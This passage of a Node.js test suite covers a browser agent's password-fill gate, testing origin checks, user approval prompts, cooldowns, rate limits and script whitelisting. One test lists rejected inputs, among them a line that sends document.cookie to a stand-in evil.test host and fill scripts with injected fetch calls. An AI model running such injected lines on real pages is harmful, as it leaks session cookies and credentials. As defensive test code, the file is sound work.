'use strict';
// Vault fill: the preview.act `vault` requests Hermes sends to fill a saved login into an agent tab.
// The gate (bot, tab, exact origin, prompt, re-check) runs against fake tabs; the real page scripts are
// exercised against a real page in vault-fill-electron.cjs. Pure Node: no sockets, no Electron.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { createVaultFill, isVaultRequest } = require('../src/vault-fill.cjs');
const { FILL } = require('../src/vault-scripts.cjs');
const { PW, ORIGIN, inspectJs, fillJs, makeTab } = require('./vault-fixtures.cjs');
const { clearJs } = require('../src/vault-scripts.cjs');

function rig({ decision = true, ...limits } = {}) {
  const tabs = new Map(), asks = [], logs = [], answers = [], clock = { t: 1_000_000 };
  const bots = { s1: 'bot1', s2: 'bot2' };
  const rigState = { decision };
  const vault = createVaultFill({
    botFor: (storedId) => bots[storedId] || '', nameFor: (id) => `Bot ${id}`, listTabs: () => tabs.values(), command: (tab, method, params) => tab.cdp(method, params),
    ask: async (info, signal) => { asks.push(info); return typeof rigState.decision === 'function' ? rigState.decision(info, signal) : rigState.decision; },
    log: (event, fields) => logs.push([event, fields]), now: () => clock.t, ...limits,
  });
  const requests = [];
  const call = async (storedId, v, { signal } = {}) => {
    const request = { storedId, sessionId: `rt-${storedId}`, params: { session_id: `rt-${storedId}`, action: 'vault', vault: v }, signal };
    requests.push(request);
    const out = await vault.handle(request);
    answers.push(out);
    return { ...JSON.parse(out.value), raw: out.value };
  };
  const add = (opts) => { const tab = makeTab(opts); tabs.set(tab.id, tab); return tab; };
  const open = async (storedId = 's1') => { const r = await call(storedId, { operation: 'open' }); assert.equal(r.success, true, `open: ${r.raw}`); return r.target; };
  const evaluate = (target, expression, storedId = 's1') => call(storedId, { operation: 'evaluate', target, expression });
  const everything = () => JSON.stringify([answers, logs, asks]);
  return { vault, tabs, asks, logs, answers, requests, clock, state: rigState, call, add, open, evaluate, everything };
}
const noPassword = (r) => assert.equal(r.everything().includes('CANARY'), false, 'the canary appears nowhere an answer, log or prompt could carry it');
const ranFill = (tab) => tab.frame.ran.filter((c) => c.includes('const expectedOrigin'));

test('fills the password on the exact origin after Allow once, and says nothing else', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  const href = await r.evaluate(target, 'window.location.href');
  assert.deepEqual([href.success, href.result], [true, `${ORIGIN}/`], 'only the origin leaves, taken from the main process');
  assert.equal(tab.frame.ran.length, 0, 'the page was not asked for its own address');
  const inspected = await r.evaluate(target, inspectJs());
  assert.equal(inspected.success, true);
  const done = await r.evaluate(target, fillJs());
  assert.deepEqual([done.success, done.result], [true, '{"filled":1}']);
  assert.equal(r.asks.length, 1);
  assert.deepEqual(r.asks[0], { botId: 'bot1', botName: 'Bot bot1', origin: ORIGIN });
  assert.equal(ranFill(tab).length, 1);
  assert.ok(ranFill(tab)[0].includes('const nonce = "0123456789abcdef"'));
  assert.equal(JSON.parse(ranFill(tab)[0].match(/const fills = (.*);\n/)[1])[0].value, PW, 'the page received the exact password');
  noPassword(r);
  const closed = await r.call('s1', { operation: 'close', target });
  assert.equal(closed.success, true);
  assert.equal((await r.evaluate(target, 'window.location.href')).success, false, 'a closed target is gone');
});

test('the password is dropped from the request once it is typed', async () => {
  const r = rig(); r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  const request = () => r.requests.at(-1);
  await r.evaluate(target, fillJs());
  assert.equal(request().params.vault.expression, '');
});

test('refuses unless the tab origin equals the origin the entry is bound to', async () => {
  const cases = [
    ['https://example.com', 'http://example.com/login', 'http vs https'],
    ['http://example.com', 'https://example.com/login', 'https vs http'],
    ['https://example.com', 'https://sub.example.com/login', 'a subdomain'],
    ['https://sub.example.com', 'https://example.com/login', 'the parent of a subdomain entry'],
    ['https://example.com', 'https://example.com.evil.test/login', 'a suffix lookalike'],
    ['https://example.com', 'https://evilexample.com/login', 'a prefix lookalike'],
    ['https://example.com', 'https://example.com:8443/login', 'another port'],
    ['https://example.com', 'https://example.com@evil.test/login', 'userinfo that looks like the host'],
    ['https://example.com', 'https://exаmple.com/login', 'a Cyrillic lookalike'],
    ['https://example.com', 'https://example.com./login', 'a trailing dot'],
  ];
  for (const [bound, url, why] of cases) {
    const r = rig(), tab = r.add({ url });
    const target = await r.open();
    await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ origin: bound }));
    assert.deepEqual([out.success, out.error_type], [false, 'origin_mismatch'], why);
    assert.equal(r.asks.length, 0, `${why}: the user is not asked about a fill that cannot happen`);
    assert.equal(ranFill(tab).length, 0, `${why}: nothing reached the page`);
    noPassword(r);
  }
});

test('refuses an entry origin that is not a plain http(s) origin', async () => {
  for (const origin of ['https://example.com/', 'HTTPS://EXAMPLE.COM', 'null', '', 'file:///tmp/x', 'about:blank', 'https://example.com/login', 7]) {
    const r = rig(), tab = r.add();
    const target = await r.open();
    await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ origin }));
    assert.equal(out.success, false, String(origin));
    assert.equal(ranFill(tab).length + r.asks.length, 0, String(origin));
  }
});

test('refuses a main frame whose address is not the tab address (nothing is filled across frames)', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  tab.frame.url = 'https://evil.test/embedded';
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'page_changed']);
  assert.equal(ranFill(tab).length, 0);
});

test("refuses a tab that is not an agent tab owned by this conversation's bot", async () => {
  const mine = [['another bot', { botId: 'bot2' }], ['no bot', { botId: 'shared' }], ['a human-controlled tab', { controller: 'human' }]];
  for (const [why, opts] of mine) {
    const r = rig(), tab = r.add(opts);
    const out = await r.call('s1', { operation: 'open' });
    assert.equal(out.success, false, why);
    assert.equal(tab.frame.ran.length + r.asks.length, 0, why);
  }
  for (const [why, opts] of [['an extension page', { id: 'x' }], ['a local PDF', { id: 'p' }], ['a dead page', { id: 'd' }]]) {
    const r = rig(), tab = r.add(opts);
    if (why.includes('extension')) tab.extensionPage = true;
    if (why.includes('PDF')) tab.localPdf = true;
    if (why.includes('dead')) tab.wc.destroyed = true;
    assert.equal((await r.call('s1', { operation: 'open' })).success, false, why);
  }
  const r = rig(); r.add();
  assert.equal((await r.call('nobody', { operation: 'open' })).error_type, 'no_bot', 'a conversation no bot owns');
  const other = await r.call('s2', { operation: 'open' });
  assert.equal(other.error_type, 'no_tab', "bot2 cannot use bot1's tab");
});

test('a target is usable only by the conversation that opened it', async () => {
  const r = rig(); r.add(); r.add({ id: 't2', botId: 'bot2' });
  const target = await r.open('s1');
  const out = await r.evaluate(target, 'window.location.href', 's2');
  assert.deepEqual([out.success, out.error_type], [false, 'unknown_target']);
});

test('Deny refuses, and a retry inside the cooldown does not ask again', async () => {
  const r = rig({ decision: false }), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  const denied = await r.evaluate(target, fillJs());
  assert.deepEqual([denied.success, denied.error_type], [false, 'denied']);
  const target2 = await r.open();
  await r.evaluate(target2, inspectJs());
  const again = await r.evaluate(target2, fillJs());
  assert.equal(again.error_type, 'denied_recently');
  assert.equal(r.asks.length, 1);
  assert.equal(ranFill(tab).length, 0);
  r.clock.t += 61_000; r.state.decision = true;
  const target3 = await r.open();
  await r.evaluate(target3, inspectJs());
  assert.equal((await r.evaluate(target3, fillJs())).success, true, 'after the cooldown it asks again');
  noPassword(r);
});

test('only a plain true is an Allow', async () => {
  for (const decision of [1, 'allow', 'true', {}, [true]]) {
    const r = rig({ decision }), tab = r.add();
    const target = await r.open(); await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs());
    assert.equal(out.success, false, String(decision));
    assert.equal(ranFill(tab).length, 0, String(decision));
  }
});

test('no answer, a withdrawn request or a timeout all refuse', async () => {
  let r = rig({ decision: null }); let tab = r.add();
  let target = await r.open(); await r.evaluate(target, inspectJs());
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_answer');
  assert.equal(ranFill(tab).length, 0);

  r = rig({ askMs: 20, decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await r.open(); await r.evaluate(target, inspectJs());
  const slow = await r.evaluate(target, fillJs());
  assert.deepEqual([slow.success, slow.error_type], [false, 'no_answer'], 'an Allow that arrives after the deadline does not count');
  assert.equal(ranFill(tab).length, 0);

  const withdraw = new AbortController();
  r = rig({ decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await r.open(); await r.evaluate(target, inspectJs());
  const request = r.vault.handle({ storedId: 's1', sessionId: 'rt-s1', signal: withdraw.signal,
    params: { session_id: 'rt-s1', action: 'vault', vault: { operation: 'evaluate', target, expression: fillJs() } } });
  await new Promise((resolve) => setImmediate(resolve));
  withdraw.abort();
  const withdrawn = JSON.parse((await request).value);
  assert.deepEqual([withdrawn.success, withdrawn.error_type], [false, 'no_answer'], 'a withdrawn request is not an Allow');
  assert.equal(ranFill(tab).length, 0);
});

test('a second fill while the prompt is open is refused, not stacked', async () => {
  let release;
  const r = rig({ decision: () => new Promise((resolve) => { release = resolve; }) });
  r.add(); r.add({ id: 't2', botId: 'bot2' });
  const a = await r.open('s1'), b = await r.open('s2');
  await r.evaluate(a, inspectJs()); await r.evaluate(b, inspectJs('fedcba9876543210'), 's2');
  const first = r.evaluate(a, fillJs());
  await new Promise((resolve) => setImmediate(resolve));
  const second = await r.evaluate(b, fillJs({ nonce: 'fedcba9876543210' }), 's2');
  assert.deepEqual([second.success, second.error_type], [false, 'busy']);
  release(true);
  assert.equal((await first).success, true);
});

test('anything that changes between the prompt and the fill refuses and types nothing', async () => {
  const changes = [
    ['a navigation to another site', (tab) => tab.go('https://evil.test/')],
    ['a navigation inside the same site', (tab) => tab.go(`${ORIGIN}/other`)],
    ['an in-page navigation', (tab) => { tab.generation++; }],
    ['a navigation that has started', (tab) => { tab.navigationUrl = 'https://evil.test/'; }],
    ['the page failing to load', (tab) => { tab.error = 'This page stopped.'; }],
    ['the human taking the tab', (tab) => { tab.controller = 'human'; }],
    ['control changing hands', (tab) => { tab.epoch++; }],
    ['the tab moving to another bot', (tab) => { tab.botId = 'bot2'; }],
    ['the page crashing', (tab) => { tab.wc.isCrashed = () => true; }],
    ['the tab closing', (tab, r) => { r.tabs.delete(tab.id); }],
    ['the page being destroyed', (tab) => { tab.wc.destroyed = true; }],
  ];
  for (const [why, change] of changes) {
    const r = rig(), tab = r.add();
    r.state.decision = () => { change(tab, r); return true; };
    const target = await r.open(); await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs());
    assert.equal(out.success, false, why);
    assert.equal(ranFill(tab).length, 0, `${why}: the password never reached the page`);
    noPassword(r);
  }
});

test('refuses while the tab is navigating or after it moved since the target was opened', async () => {
  let r = rig(), tab = r.add();
  tab.navigationUrl = 'https://example.com/next';
  assert.equal((await r.call('s1', { operation: 'open' })).error_type, 'navigating');
  tab.navigationUrl = '';
  const target = await r.open();
  tab.navigationUrl = 'https://example.com/next';
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'navigating');
  tab.navigationUrl = '';
  tab.go(`${ORIGIN}/elsewhere`);
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'page_changed');
  assert.equal((await r.evaluate(target, inspectJs())).error_type, 'page_changed');
});

test('malformed requests are refused before any page script runs', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  const bad = [
    {}, { operation: 7 }, { operation: 'unlock' }, { operation: 'evaluate' }, { operation: 'evaluate', target: 7, expression: 'x' },
    { operation: 'evaluate', target, expression: 7 }, { operation: 'evaluate', target, expression: '' },
    { operation: 'evaluate', target, expression: 'x'.repeat(200_000) }, { operation: 'close' }, { operation: 'close', target: {} },
    { operation: 'evaluate', target: 'not-a-target', expression: 'window.location.href' },
  ];
  for (const v of bad) assert.equal((await r.call('s1', v)).success, false, JSON.stringify(v).slice(0, 60));
  for (const params of [null, [], 'x', { action: 'vault' }, { action: 'vault', vault: [] }, { action: 'vault', vault: 'open' }]) {
    const out = JSON.parse((await r.vault.handle({ storedId: 's1', sessionId: 'rt-s1', params })).value);
    assert.equal(out.success, false, JSON.stringify(params));
  }
  assert.equal(tab.frame.ran.length, 0);
});

test('only the exact scripts Hermes builds are run in the page', async () => {
  const injected = (extra) => fillJs().replace(/\}\)\(\)$/, () => `${extra}})()`);
  const foreign = [
    'document.cookie', "fetch('https://evil.test/' + document.cookie)", 'window.location.href;1', ' window.location.href',
    inspectJs() + ';fetch(1)', `${inspectJs()}\n`, inspectJs().replace('getComputedStyle', 'fetch'), inspectJs('abc'), inspectJs('0123456789abcdef"; fetch(1); "'),
    injected(';fetch(1);'), fillJs().replace('window.location.origin !== expectedOrigin', 'false'), fillJs().replace('el.type !== "password"', 'false'),
    FILL.replace('__EXPECTED_ORIGIN__', '"https://example.com"').replace('__FILLS__', '[{"index":1,"token":"current-password","value":"x"}];fetch(1);//').replace('__NONCE__', '"0123456789abcdef"'),
    FILL.replace('__EXPECTED_ORIGIN__', '"https://example.com"').replace('__FILLS__', '[{"index":1,"token":"current-password","value":"x","run":"fetch(1)"}]').replace('__NONCE__', '"0123456789abcdef"'),
  ];
  const r = rig(), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  tab.frame.ran.length = 0;
  for (const expression of foreign) {
    const out = await r.evaluate(target, expression);
    assert.equal(out.success, false, expression.slice(0, 80));
  }
  assert.equal(tab.frame.ran.length, 0, 'none of it reached the page');
  assert.equal(r.asks.length, 0);
});

test('one-time codes, identifiers, cards and unlock are not supported yet', async () => {
  const unsupported = [
    [{ index: 1, token: 'one-time-code', value: '123456' }],
    [{ index: 1, token: 'current-password', value: PW }, { index: 0, token: 'username', value: 'me@example.com' }],
    [{ index: 1, token: 'cc-number', value: '4111111111111111' }],
    [{ index: 1, token: 'current-password', value: PW }, { index: 2, token: 'current-password', value: PW }],
    [],
  ];
  for (const fills of unsupported) {
    const r = rig(), tab = r.add();
    const target = await r.open(); await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ fills }));
    assert.equal(out.success, false, JSON.stringify(fills).slice(0, 50));
    assert.ok(fills.length === 0 || /not supported yet/i.test(out.error), out.error);
    assert.equal(r.asks.length + ranFill(tab).length, 0);
  }
  const r = rig(); r.add();
  assert.match((await r.call('s1', { operation: 'unlock' })).error, /not supported yet/i);
});

test('a fill needs the inspection it stamps, and runs once per target', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_inspection');
  await r.evaluate(target, inspectJs());
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'ffffffffffffffff' }))).error_type, 'no_inspection', 'another inspection\'s stamps');
  assert.equal((await r.evaluate(target, fillJs())).success, true);
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'already_filled');
  assert.equal(ranFill(tab).length, 1);
  assert.equal(r.asks.length, 1, 'one Allow covers one fill');
});

test('what the page answers is rebuilt, not passed on', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  tab.page.inspect = () => JSON.stringify([
    { autocomplete: 'current-password', formIndex: 0, index: 1, maxLength: null, label: 'Password '.repeat(100), name: 'pw', type: 'password', secretish: 'CANARY-from-page' },
    { autocomplete: 'username', formIndex: 0, index: 0, maxLength: null, label: 'Email address', name: 'user', type: 'text' },
    { index: -3, type: 'password' }, 'junk', { index: 4, type: 'password', formIndex: 'x', maxLength: 'y', label: 5 },
  ]);
  const inspected = await r.evaluate(target, inspectJs());
  const controls = JSON.parse(inspected.result);
  assert.deepEqual(controls.map((c) => c.index), [1, 4], 'only password controls, with a sane index');
  assert.deepEqual(Object.keys(controls[0]).sort(), ['autocomplete', 'formIndex', 'index', 'label', 'maxLength', 'name', 'type']);
  assert.ok(controls[0].label.length <= 200);
  assert.equal(controls[1].formIndex, null);
  assert.equal(inspected.raw.includes('from-page'), false);

  tab.page.inspect = () => 'not json';
  const target2 = await r.open();
  assert.equal((await r.evaluate(target2, inspectJs())).error_type, 'page_failed');

  tab.page.inspect = () => '[]';
  tab.page.fill = () => JSON.stringify({ filled: 1, echo: PW });
  const target3 = await r.open(); await r.evaluate(target3, inspectJs());
  assert.equal((await r.evaluate(target3, fillJs())).result, '{"filled":1}', 'a count, rebuilt');
  tab.page.fill = () => PW;
  const target4 = await r.open(); await r.evaluate(target4, inspectJs());
  const garbled = await r.evaluate(target4, fillJs({ origin: ORIGIN }));
  assert.equal(garbled.error_type, 'page_failed');
  tab.page.fill = () => '{"refused":"origin_changed","found":"https://evil.test"}';
  const target5 = await r.open(); await r.evaluate(target5, inspectJs());
  const moved = await r.evaluate(target5, fillJs());
  assert.deepEqual([moved.success, JSON.parse(moved.result).refused], [true, 'origin_changed'], "Hermes's own origin_changed answer");
  assert.equal(JSON.parse(moved.result).found, ORIGIN, 'named from the app, not the page');
  noPassword(r);
});

test('a page error that quotes the script never reaches the answer or the log', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open(); await r.evaluate(target, inspectJs());
  tab.page.fill = (code) => { throw new Error(`Uncaught: ${code.slice(0, 4000)}`); };
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'page_failed']);
  noPassword(r);
});

test('a target expires, and open targets are bounded', async () => {
  const r = rig(); r.add();
  const target = await r.open();
  r.clock.t += 5 * 60_000 + 1;
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'unknown_target');
  const targets = [];
  for (let i = 0; i < 20; i++) targets.push(await r.open());
  assert.equal((await r.evaluate(targets[0], 'window.location.href')).success, false, 'the oldest is dropped');
  assert.equal((await r.evaluate(targets.at(-1), 'window.location.href')).success, true);
});

test('logs name the step and the reason, nothing about the site, the account or the password', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open(); await r.evaluate(target, inspectJs());
  await r.evaluate(target, fillJs());
  tab.go('https://evil.test/');
  await r.evaluate(target, 'window.location.href');
  assert.ok(r.logs.length >= 3);
  for (const [event, fields] of r.logs) {
    assert.match(event, /^vault\./);
    assert.deepEqual(Object.keys(fields).filter((k) => !['op', 'ok', 'reason'].includes(k)), []);
  }
  assert.equal(JSON.stringify(r.logs).includes('example.com'), false);
});

test('isVaultRequest names the vault family and nothing else', () => {
  assert.equal(isVaultRequest('preview.act', { action: 'vault', vault: {} }), true);
  assert.equal(isVaultRequest('preview.act', { action: 'click' }), false);
  for (const m of ['vault.code', 'vault.unlock_prompt', 'vault.save_login']) assert.equal(isVaultRequest(m, {}), true, m);
  for (const m of ['approval', 'clarify', 'preview.read', 'sudo']) assert.equal(isVaultRequest(m, { action: 'vault' }), false, m);
});

// ── review findings ─────────────────────────────────────────────────────────────────────────────────────────────

const stamps = (tab) => tab.cleared.length;
const prepare = async (r, nonce) => { const target = await r.open(); await r.evaluate(target, inspectJs(nonce)); return target; };

test('H1a: every vault script runs in an isolated world of the main frame, never in the page\'s own world', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  assert.equal((await r.evaluate(target, fillJs())).success, true, 'the fake tab throws if the main world is used');
  assert.equal(tab.worlds.length, 2, 'one world per script, both isolated');
  for (const world of tab.worlds) assert.deepEqual([world.frameId, typeof world.worldName, world.grantUniveralAccess], ['main-frame', 'string', false]);
});

test('H1a: a CDP failure or an exception in the world is a refusal that never quotes the script', async () => {
  for (const fail of [() => { throw new Error(`boom ${PW}`); }, () => ({ exceptionDetails: { text: `Uncaught ${PW}`, exception: { description: PW } } })]) {
    const r = rig(), tab = r.add();
    const target = await r.open(); await r.evaluate(target, inspectJs());
    tab.cdp = async (method, params) => (method === 'Runtime.evaluate' ? fail() : { frameTree: { frame: { id: 'f' } }, executionContextId: 101 });
    const out = await r.evaluate(target, fillJs());
    assert.deepEqual([out.success, out.error_type], [false, 'page_failed']);
    noPassword(r);
  }
});

test('M1: a top document with an opaque origin is never filled, even though its URL matches', async () => {
  let r = rig(), tab = r.add();
  tab.frame.origin = 'null';
  const opened = await r.call('s1', { operation: 'open' });
  assert.deepEqual([opened.success, opened.error_type], [false, 'opaque_origin']);

  r = rig(); tab = r.add();
  const target = await r.open(); await r.evaluate(target, inspectJs());
  tab.frame.origin = 'null';
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'opaque_origin']);
  assert.equal(r.asks.length + ranFill(tab).length, 0, 'no prompt, no script');

  r = rig(); tab = r.add();
  const t2 = await r.open(); await r.evaluate(t2, inspectJs());
  tab.frame.origin = 'https://evil.test';
  assert.equal((await r.evaluate(t2, fillJs())).error_type, 'page_changed', 'a frame origin that is not the URL\'s origin');
  assert.equal(ranFill(tab).length, 0);
});

test('H1b: the tab is locked from the prompt on, kept after a fill, and released when no fill happened', async () => {
  const lockAtPrompt = [];
  let r = rig({ decision: () => { lockAtPrompt.push(tab.vaultLock); return true; } }), tab = r.add();
  let target = await prepare(r);
  assert.equal(tab.vaultLock, undefined, 'nothing is locked before a fill reaches the prompt');
  assert.equal((await r.evaluate(target, fillJs())).success, true);
  assert.deepEqual(lockAtPrompt, ['prompt'], 'locked while the prompt is open, so nothing can be planted meanwhile');
  assert.equal(tab.vaultLock, 'filled', 'kept after the fill');

  // A later refused attempt on the same tab does not lift an earlier fill\'s lock.
  r.state.decision = false;
  r.clock.t += 1000;
  target = await prepare(r, 'aaaaaaaaaaaaaaaa');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'aaaaaaaaaaaaaaaa' }))).error_type, 'denied');
  assert.equal(tab.vaultLock, 'filled');

  const released = [
    ['Deny', rig({ decision: false }), 'denied'],
    ['no answer', rig({ decision: null }), 'no_answer'],
  ];
  for (const [why, rr, reason] of released) {
    const t = rr.add(), tg = await prepare(rr);
    const out = await rr.evaluate(tg, fillJs());
    assert.equal(out.error_type, reason, why);
    assert.equal(t.vaultLock, undefined, `${why}: released`);
  }
  // The page refused (it moved) or typed nothing: released. Anything else that ran: kept.
  for (const [why, answer, held] of [['moved', '{"refused":"origin_changed","found":"https://x.test"}', undefined], ['nothing typed', '{"filled":0}', undefined],
    ['unreadable answer', 'garbage', 'filled'], ['page error', () => { throw new Error('x'); }, 'filled']]) {
    const rr = rig(), t = rr.add(), tg = await prepare(rr);
    t.page.fill = typeof answer === 'function' ? answer : () => answer;
    await rr.evaluate(tg, fillJs());
    assert.equal(t.vaultLock, held, why);
  }
  for (const [why, change] of [['a navigation after the prompt', (t) => t.go('https://evil.test/')], ['control changing hands', (t) => { t.epoch++; }]]) {
    const rr = rig({ decision: () => { change(t); return true; } }), t = rr.add(), tg = await prepare(rr);
    assert.equal((await rr.evaluate(tg, fillJs())).success, false, why);
    assert.equal(t.vaultLock, undefined, `${why}: released`);
  }
  // A fill refused before the prompt never locks.
  const early = rig(), et = early.add({ url: 'https://other.test/' }), eg = await prepare(early);
  assert.equal((await early.evaluate(eg, fillJs())).error_type, 'origin_mismatch');
  assert.equal(et.vaultLock, undefined);
});

test('H1b: a fill is refused when the agent has run script in this document, and says to reload', async () => {
  const r = rig(), tab = r.add();
  tab.agentScripted = true;
  const target = await prepare(r);
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'page_scripted']);
  assert.match(out.error, /reload|navigate/i);
  assert.equal(r.asks.length + ranFill(tab).length, 0);
  assert.equal(tab.vaultLock, undefined);
});

test('M2: an unanswered prompt starts the cooldown too, but a withdrawn request does not', async () => {
  let r = rig({ decision: null }), tab = r.add();
  let target = await prepare(r);
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_answer');
  target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'bbbbbbbbbbbbbbbb' }))).error_type, 'denied_recently');
  assert.equal(r.asks.length, 1);

  r = rig({ askMs: 15, decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await prepare(r);
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_answer');
  target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'bbbbbbbbbbbbbbbb' }))).error_type, 'denied_recently', 'a timeout counts as no answer');

  const withdraw = new AbortController();
  r = rig({ decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await prepare(r);
  const pending = r.vault.handle({ storedId: 's1', sessionId: 'rt-s1', signal: withdraw.signal, params: { session_id: 'rt-s1', action: 'vault', vault: { operation: 'evaluate', target, expression: fillJs() } } });
  await new Promise((resolve) => setImmediate(resolve));
  withdraw.abort(); await pending;
  r.state.decision = true;
  target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'bbbbbbbbbbbbbbbb' }))).success, true, 'Stop is not a refusal to be punished');
});

test('M2: three prompts a minute per bot, then refused until the minute passes', async () => {
  const r = rig({ decision: false }), tab = r.add();
  const nonces = ['1000000000000000', '2000000000000000', '3000000000000000', '4000000000000000', '5000000000000000'];
  const sites = ['https://a.test', 'https://b.test', 'https://c.test', 'https://d.test'];
  const attempt = async (i) => {
    tab.go(`${sites[i % 4]}/login`);
    const target = await prepare(r, nonces[i]);
    return r.evaluate(target, fillJs({ origin: sites[i % 4], nonce: nonces[i] }));
  };
  assert.deepEqual([(await attempt(0)).error_type, (await attempt(1)).error_type, (await attempt(2)).error_type], ['denied', 'denied', 'denied']);
  const fourth = await attempt(3);
  assert.deepEqual([fourth.success, fourth.error_type], [false, 'rate_limited']);
  assert.equal(r.asks.length, 3, 'the fourth never prompted');
  r.clock.t += 61000;
  assert.equal((await attempt(4)).error_type, 'denied', 'asked again after the minute');
  assert.equal(r.asks.length, 4);
});

test('M2: when the app is not the active app nothing is queued, the user is not asked, and the reason says so', async () => {
  const r = rig({ decision: 'inactive' }), tab = r.add();
  let target = await prepare(r);
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'app_inactive']);
  assert.equal(tab.vaultLock, undefined);
  assert.equal(ranFill(tab).length, 0);
  r.state.decision = true;
  target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'bbbbbbbbbbbbbbbb' }))).success, true, 'no cooldown for a prompt that was never shown');
  // Attempts that were never shown do not use up the per-minute cap either.
  const quiet = rig({ decision: 'inactive' }); quiet.add();
  for (let j = 0; j < 5; j++) {
    const nonce = String(j).repeat(16), tg = await prepare(quiet, nonce);
    assert.equal((await quiet.evaluate(tg, fillJs({ nonce }))).error_type, 'app_inactive');
  }
});

test('L1: an ask that never settles cannot wedge the prompt slot', async () => {
  const r = rig({ askMs: 15, decision: () => new Promise(() => {}) }), tab = r.add();
  let target = await prepare(r);
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_answer');
  r.clock.t += 61000; r.state.decision = true;
  target = await prepare(r, 'bbbbbbbbbbbbbbbb');
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'bbbbbbbbbbbbbbbb' }))).success, true, 'not busy afterwards');
  void tab;
});

test('L2: a page answer that is not a string, or is over 256 KiB, is refused before it is parsed', async () => {
  const huge = JSON.stringify([{ type: 'password', index: 1, label: 'x'.repeat(300 * 1024) }]);
  for (const [why, answer] of [['an object', { filled: 1 }], ['a number', 1], ['over 256 KiB', huge], ['null', null]]) {
    let r = rig(), tab = r.add();
    tab.page.inspect = () => answer;
    const out = await r.evaluate(await r.open(), inspectJs());
    assert.deepEqual([out.success, out.error_type], [false, 'page_failed'], `inspect: ${why}`);
    r = rig(); tab = r.add();
    const target = await prepare(r);
    tab.page.fill = () => (why === 'over 256 KiB' ? `{"filled":1,"pad":"${'x'.repeat(300 * 1024)}"}` : answer);
    assert.equal((await r.evaluate(target, fillJs())).error_type, 'page_failed', `fill: ${why}`);
  }
});

test('L3: the stamps an inspection left are removed when the target closes, expires, or the fill is refused or ends without a fill', async () => {
  const nonce = '0123456789abcdef';
  // close
  let r = rig(), tab = r.add();
  let target = await prepare(r);
  assert.equal(stamps(tab), 0);
  await r.call('s1', { operation: 'close', target });
  assert.deepEqual(tab.cleared, [clearJs(nonce)], 'close clears this inspection\'s stamps only');
  // an inspection that is never followed up, then the target expires
  r = rig(); tab = r.add();
  target = await prepare(r);
  r.clock.t += 5 * 60000 + 1;
  await r.evaluate(target, 'window.location.href');
  assert.equal(stamps(tab), 1, 'expiry clears');
  // evicted by newer targets
  r = rig(); tab = r.add();
  await prepare(r);
  for (let i = 0; i < 16; i++) await r.open();
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(stamps(tab), 1, 'eviction clears');
  // refused fills
  for (const [why, setup, expected] of [
    ['Deny', (rr) => { rr.state.decision = false; }, 'denied'],
    ['no answer', (rr) => { rr.state.decision = null; }, 'no_answer'],
    ['origin mismatch', () => {}, 'origin_mismatch'],
    ['not supported', () => {}, 'unsupported'],
  ]) {
    const rr = rig(), t = rr.add();
    setup(rr);
    const tg = await prepare(rr);
    const out = await rr.evaluate(tg, why === 'origin mismatch' ? fillJs({ origin: 'https://other.test' }) : why === 'not supported' ? fillJs({ fills: [{ index: 1, token: 'one-time-code', value: '1' }] }) : fillJs());
    assert.equal(out.error_type, expected, why);
    assert.equal(stamps(t), 1, `${why}: cleared`);
  }
  // the page's own refusal and an empty fill leave stamps too (its script returns before removing them)
  for (const answer of ['{"refused":"origin_changed","found":"https://x.test"}', '{"filled":0}']) {
    const rr = rig(), t = rr.add(), tg = await prepare(rr);
    t.page.fill = () => answer;
    await rr.evaluate(tg, fillJs());
    assert.equal(stamps(t), 1, answer);
  }
  // a successful fill removed them itself
  const ok = rig(), ot = ok.add(), og = await prepare(ok);
